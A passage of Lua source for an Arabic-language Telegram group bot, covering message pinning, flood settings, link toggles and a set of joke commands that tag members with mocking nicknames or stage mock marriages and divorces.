' }\n'..'🔖┇ الجهات ← { '..lock_phon..
' }\n'..'🔖┇ الدخول ← { '..lock_join..
' }\n'..'🔖┇ الاضافه ← { '..lock_add..
' }\n'..'🔖┇ السيلفي ← { '..lock_self..
' }\n'..'🔖┇ الالعاب ← { '..lock_geam..
' }\n'..'🔖┇ التكرار ← { '..flood..
' }\n'..'🔖┇ الترحيب ← { '..welcome..
' }\n'..'🔖┇ عدد التكرار ← { '..NUM_MSG_MAX..
' }\nء┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉'..
'\n🔰┇ علامة ال {✓} تعني مفعل'..
'\n🔰┇ علامة ال {✘} تعني معطل'..
'\nء┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉'..
'\n'..'📮┇ امر صيح ← { '..kickme..
' }\n'..'📮┇ امر اطردني ← { '..sehuser..
' }\n'..'📮┇ امر منو ضافني ← { '..addme..
' }\n'..'📮┇ ردود المدير ← { '..rdmder..
' }\n'..'📮┇ ردود المطور ← { '..rdsudo..
' }\n'..'📮┇ الايدي ← { '..idgp..
' }\n'..'📮┇ الايدي بالصوره ← { '..idph..
' }\n'..'📮┇ الرفع ← { '..setadd..
' }\n'..'📮┇ الحظر ← { '..banm..' }\n\n┉  ┉  ┉  ┉ ┉  ┉  ┉  ┉  ┉  ┉\n🔖┇ CH » @R_IQ9\n'
send(msg.chat_id_, msg.id_,text)     
end    
if text ==('تثبيت') and msg.reply_to_message_id_ ~= 0 and Mod(msg) then  
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• اشترك اولا ['..database:get(bot_id..'add:ch:username')..'⚜️]')
end
return false
end
if database:sismember(bot_id..'lock:pin',msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_,msg.id_,"܁༯┆التثبيت ܊ الغاء تثبيت . تم قفله من قبل المنشئين ↝ ܰ")  
return false  
end
tdcli_function ({ID = "PinChannelMessage",channel_id_ = msg.chat_id_:gsub('-100',''),message_id_ = msg.reply_to_message_id_,disable_notification_ = 1},function(arg,data) 
if data.ID == "Ok" then
send(msg.chat_id_, msg.id_,"܁༯┆تم تثبيت الرسالة بنجاح ↝ ܰ")   
database:set(bot_id..'Pin:Id:Msg'..msg.chat_id_,msg.reply_to_message_id_)
elseif data.code_ == 6 then
send(msg.chat_id_,msg.id_,"܁༯┆انا لست ادمن في المجموعة يرجى ترقيتي ↝ ܰ")  
elseif data.message_ == "CHAT_NOT_MODIFIED" then
send(msg.chat_id_,msg.id_,"܁༯┆لا توجد رسالة مثبتة ↝ ܰه")  
elseif data.message_ == "CHAT_ADMIN_REQUIRED" then
send(msg.chat_id_,msg.id_,"܁༯┆ليست لدي صلاحيات التثبيت ↝ ܰ")  
end
end,nil) 
end
if text == 'الغاء التثبيت' and Mod(msg) then  
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• اشترك اولا ['..database:get(bot_id..'add:ch:username')..'⚜️]')
end
return false
end
if database:sismember(bot_id..'lock:pin',msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_,msg.id_,"܁༯┆التثبيت ܊ الغاء تثبيت . تم قفله من قبل المنشئين ↝ ܰ")  
return false  
end
tdcli_function({ID="UnpinChannelMessage",channel_id_ = msg.chat_id_:gsub('-100','')},function(arg,data) 
if data.ID == "Ok" then
send(msg.chat_id_, msg.id_,"܁༯┆تم الغاء تثبيت الرسالة بنجاح ↝ ܰ")   
database:del(bot_id..'Pin:Id:Msg'..msg.chat_id_)
elseif data.code_ == 6 then
send(msg.chat_id_,msg.id_,"܁༯┆انا لست ادمن في المجموعة يرجى ترقيتي ↝ ܰ")  
elseif data.message_ == "CHAT_NOT_MODIFIED" then
send(msg.chat_id_,msg.id_,"܁༯┆لا توجد رسالة مثبتة ↝ ܰ")  
elseif data.message_ == "CHAT_ADMIN_REQUIRED" then
send(msg.chat_id_,msg.id_,"܁༯┆ليست لدي صلاحيات التثبيت ↝ ܰ")  
end
end,nil)
end

if text and text:match('^ضع تكرار (%d+)$') and Mod(msg) then   
local Num = text:match('ضع تكرار (.*)')
database:hset(bot_id.."flooding:settings:"..msg.chat_id_ ,"floodmax" ,Num) 
send(msg.chat_id_, msg.id_,'܁༯┆تم وضع عدد االتكرار ◃ ◞ [('..Num..')](t.me/R_IQ9) ◟ ↝ ܰ')  
end 
if text and text:match('^ضع زمن التكرار (%d+)$') and Mod(msg) then   
local Num = text:match('^ضع زمن التكرار (%d+)$')
database:hset(bot_id.."flooding:settings:"..msg.chat_id_ ,"floodtime" ,Num) 
send(msg.chat_id_, msg.id_,'📮┇ تم وضع زمن التكرار ('..Num..')') 
end
if text == "ضع رابط" or text == 'وضع رابط' then
if msg.reply_to_message_id_ == 0  and Mod(msg) then  
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• اشترك اولا ['..database:get(bot_id..'add:ch:username')..'⚜️]')
end
return false
end
send(msg.chat_id_,msg.id_,"܁༯┆ههلو عمري ↝ ܰ \n܁༯┆ارسل رابط المجموعة او قناة المجموعة ↝ ܰ")
database:setex(bot_id.."Set:Priovate:Group:Link"..msg.chat_id_..""..msg.sender_user_id_,120,true) 
return false
end
end
if text == "تفعيل رابط" or text == 'تفعيل الرابط' then
if Mod(msg) then  
database:set(bot_id.."Link_Group:status"..msg.chat_id_,true) 
send(msg.chat_id_, msg.id_,"܁༯┆ههلو عمري ↝ ܰ\n܁༯┆تم تفعيل الرابط ↝ ܰ") 
return false  
end
end
if text == "تعطيل رابط" or text == 'تعطيل الرابط' then
if Mod(msg) then  
database:del(bot_id.."Link_Group:status"..msg.chat_id_) 
send(msg.chat_id_, msg.id_,"܁༯┆ههلو عمري ↝ ܰ \n܁༯┆تم تعطيل الرابط ↝ ܰ") 
return false end
end
if text == "تفعيل صورتي" or text == 'تفعيل الصوره' then
if Mod(msg) then  
database:set(bot_id.."my_photo:status"..msg.chat_id_,true) 
send(msg.chat_id_, msg.id_,"܁༯┆ههلو عمري ↝ ܰ \n܁༯┆تم تفعيل امر صورتي ↝ ܰ") 
return false  
end
end
if text == ("تاك للمطايه") and Mod(msg) then
local list = database:smembers(bot_id..'Mote:User'..msg.chat_id_)
t = "\n܁༯┆يمطاية تعالو يردونكم 😹😭↝ . \n܀⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤܀\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t.."𖠵 "..k.." ◜[@"..username.."]◞\n"
else
t = t.."𖠵 "..k.." ◜`"..v.."`◞`\n"
end
end
if #list == 0 then
t = "܁༯┆لايوجد مطايةه 😹😔↝ ܰ"
end
send(msg.chat_id_, msg.id_, t)
end
---------
if text == ("رفع مطي") and tonumber(msg.reply_to_message_id_) ~= 0 and Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'🔖| لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n 📌| اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
database:sadd(bot_id..'Mote:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n܁༯┆تم رفع العضو مطي في المجموعة 😭😹↝ ܰ'
local  statuss  = ''
send(msg.chat_id_, msg.id_, usertext..statuss)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end

if (text == ("تنزيل مطي")) and msg.reply_to_message_id_ and Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'🔖| لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n 📌| اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
database:srem(bot_id..'Mote:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n܁༯┆تم تنزيل العضو مطي في المجموعة 😭😹↝ ܰ'
status  = ''
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
-----------------------------------------------------
if text == ("تاك للثولان") and Mod(msg) then
local list = database:smembers(bot_id..'Athol:User'..msg.chat_id_)
t = "\n܁༯┆ياثولان تعالو يردونكم 😹😭↝ . \n܀⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤܀\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t.."𖠵 "..k.." ◜[@"..username.."]◞\n"
else
t = t.."𖠵 "..k.." ◜`"..v.."`◞`\n"
end
end
if #list == 0 then
t = "܁༯┆لايوجد ثولان😹😔↝ ܰ"
end
send(msg.chat_id_, msg.id_, t)
end
---------
if text == ("رفع اثول") and tonumber(msg.reply_to_message_id_) ~= 0 and Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'🔖| لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n 📌| اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
database:sadd(bot_id..'Athol:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n܁༯┆تم رفع العضو اثول في المجموعة 😭😹↝ ܰ'
local  statuss  = ''
send(msg.chat_id_, msg.id_, usertext..statuss)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end

if (text == ("تنزيل اثول")) and msg.reply_to_message_id_ and Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'🔖| لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n 📌| اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
database:srem(bot_id..'Athol:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n܁༯┆تم تنزيل العضو اثول في المجموعة 😭😹↝ ܰ'
status  = ''
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
-----------------------------------------------------
if text == ("تاك للانبياء") and Mod(msg) then
local list = database:smembers(bot_id..'Naby:User'..msg.chat_id_)
t = "\n܁༯┆يا انبياء تعالو يردونكم 😹😭↝ . \n܀⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤܀\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t.."𖠵 "..k.." ◜[@"..username.."]◞\n"
else
t = t.."𖠵 "..k.." ◜`"..v.."`◞`\n"
end
end
if #list == 0 then
t = "܁༯┆لايوجد انبياء 😹😔↝ ܰ"
end
send(msg.chat_id_, msg.id_, t)
end
---------
if text == ("رفع نبي") and tonumber(msg.reply_to_message_id_) ~= 0 and Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'🔖| لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n 📌| اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
database:sadd(bot_id..'Naby:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n܁༯┆رفعتلكم نبي جديد استقبلو 😹😭↝ ܰ'
local  statuss  = ''
send(msg.chat_id_, msg.id_, usertext..statuss)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end

if (text == ("تنزيل نبي")) and msg.reply_to_message_id_ and Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'🔖| لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n 📌| اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
database:srem(bot_id..'Naby:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n܁༯┆متستاهل النبوه نزلتك 😹😭↝ ܰ'
status  = ''
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
-----------------------------------------------------
if text == ("تاك للجلاب") and Mod(msg) then
local list = database:smembers(bot_id..'Glb:User'..msg.chat_id_)
t = "\n܁༯┆ياجلاب تعالو يردونكم 😹😭↝ . \n܀⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤܀\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t.."𖠵 "..k.." ◜[@"..username.."]◞\n"
else
t = t.."𖠵 "..k.." ◜`"..v.."`◞`\n"
end
end
if #list == 0 then
t = "܁༯┆لايوجد جلاب 😹😔↝ ܰ"
end
send(msg.chat_id_, msg.id_, t)
end
---------
if text == ("رفع جلب") and tonumber(msg.reply_to_message_id_) ~= 0 and Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'🔖| لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n 📌| اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
database:sadd(bot_id..'Glb:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n܁༯┆تم رفع العضو جلب في المجموعة 😭😹↝ ܰ'
local  statuss  = ''
send(msg.chat_id_, msg.id_, usertext..statuss)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end

if (text == ("تنزيل جلب")) and msg.reply_to_message_id_ and Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'🔖| لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n 📌| اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
database:srem(bot_id..'Glb:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n܁༯┆تم تنزيل العضو جلب في المجموعة 😭😹↝ ܰ'
status  = ''
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
-----------------------------------------------------
if text == ("تاك للصخول") and Mod(msg) then
local list = database:smembers(bot_id..'Zgal:User'..msg.chat_id_)
t = "\n܁༯┆ياصخول تعالو يردونكم 😹😭↝ . \n܀⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤܀\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t.."𖠵 "..k.." ◜[@"..username.."]◞\n"
else
t = t.."𖠵 "..k.." ◜`"..v.."`◞`\n"
end
end
if #list == 0 then
t = "܁༯┆لايوجد صخول 😹😔↝ ܰ"
end
send(msg.chat_id_, msg.id_, t)
end
---------
if text == ("رفع صخل") and tonumber(msg.reply_to_message_id_) ~= 0 and Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'🔖| لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n 📌| اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
database:sadd(bot_id..'Zgal:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n܁༯┆تم رفع العضو صخل في المجموعة 😭😹↝ ܰ'
local  statuss  = ''
send(msg.chat_id_, msg.id_, usertext..statuss)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end

if (text == ("تنزيل صخل")) and msg.reply_to_message_id_ and Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'🔖| لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n 📌| اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
database:srem(bot_id..'Zgal:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n܁༯┆تم تنزيل العضو صخل في المجموعة 😭😹↝ ܰ'
status  = ''
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
-----------------------------------------------------
if text == ("تاك للزواحيف") and Mod(msg) then
local list = database:smembers(bot_id..'Zahf:User'..msg.chat_id_)
t = "\n܁༯┆يازواحيف تعالو يردونكم 😹😭↝ . \n܀⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤܀\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t.."𖠵 "..k.." ◜[@"..username.."]◞\n"
else
t = t.."𖠵 "..k.." ◜`"..v.."`◞`\n"
end
end
if #list == 0 then
t = "܁༯┆لايوجد زواحيف 😹😔↝ ܰ"
end
send(msg.chat_id_, msg.id_, t)
end
---------
if text == ("رفع زاحف") and tonumber(msg.reply_to_message_id_) ~= 0 and Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'🔖| لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n 📌| اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
database:sadd(bot_id..'Zahf:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n܁༯┆تم رفع العضو زاحف في المجموعة 😭😹↝ ܰ'
local  statuss  = ''
send(msg.chat_id_, msg.id_, usertext..statuss)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end

if (text == ("تنزيل زاحف")) and msg.reply_to_message_id_ and Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'🔖| لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n 📌| اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
database:srem(bot_id..'Zahf:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n܁༯┆تم تنزيل العضو زاحف في المجموعة 😭😹↝ ܰ'
status  = ''
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
-----------------------------------------------------
if text == ("تاك للي بكلبي") and Mod(msg) then
local list = database:smembers(bot_id..'Galby:User'..msg.chat_id_)
t = "\n܁༯┆ياكلوب تعالو يردونكم 😹😭↝ . \n܀⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤܀\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t.."𖠵 "..k.." ◜[@"..username.."]◞\n"
else
t = t.."𖠵 "..k.." ◜`"..v.."`◞`\n"
end
end
if #list == 0 then
t = "܁༯┆لايوجد كلوب 😹😔↝ ܰ"
end
send(msg.chat_id_, msg.id_, t)
end
---------
if text == ("رفع بكلبي") and tonumber(msg.reply_to_message_id_) ~= 0 and Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'🔖| لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n 📌| اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
database:sadd(bot_id..'Galby:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n܁༯┆رفعتك بكلبي لتجرحني 😘😭↝ ܰ'
local  statuss  = ''
send(msg.chat_id_, msg.id_, usertext..statuss)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end

if (text == ("تنزيل بكلبي")) and msg.reply_to_message_id_ and Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'🔖| لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n 📌| اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
database:srem(bot_id..'Galby:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n܁༯┆مو كتلك لتجرحني نزلتك من كلبي 😭↝ ܰ'
status  = ''
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
-----------------------------------------------------
if text == ("تاك للتوج") and Mod(msg) then
local list = database:smembers(bot_id..'Tag:User'..msg.chat_id_)
t = "\n܁༯┆ياتوج تعالو يردونكم 😹😭↝ . \n܀⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤܀\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t.."𖠵 "..k.." ◜[@"..username.."]◞\n"
else
t = t.."𖠵 "..k.." ◜`"..v.."`◞`\n"
end
end
if #list == 0 then
t = "܁༯┆لايوجد تاج😹😔↝ ܰ"
end
send(msg.chat_id_, msg.id_, t)
end
---------
if text == ("رفع تاج") and tonumber(msg.reply_to_message_id_) ~= 0 and Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'🔖| لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n 📌| اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
database:sadd(bot_id..'Tag:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n܁༯┆هو تاج ميحتاج ارفعه 🤴🏻↝ ܰ'
local  statuss  = ''
send(msg.chat_id_, msg.id_, usertext..statuss)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end

if (text == ("تنزيل تاج")) and msg.reply_to_message_id_ and Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'🔖| لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n 📌| اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
database:srem(bot_id..'Tag:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n܁༯┆التاج ماينزل من مكانه 🤴🏻↝ ܰ'
status  = ''
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
-----------------------------------------------------

if text == ("نزوج") and tonumber(msg.reply_to_message_id_) ~= 0 and Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'🔖| لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n 📌| اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
database:sadd(bot_id..'Zoag:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n܁༯┆نزوج وماتباوع على غيري 🥺↝ ܰ'
local  statuss  = ''
send(msg.chat_id_, msg.id_, usertext..statuss)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end

if text == ("طالق") and tonumber(msg.reply_to_message_id_) ~= 0 and Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'🔖| لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n 📌| اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
database:sadd(bot_id..'Mote:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n܁༯┆طالق طالق طالق بالعشرة 😹😭↝ ܰ'
local  statuss  = ''
send(msg.chat_id_, msg.id_, usertext..statuss)
end,nil)
end
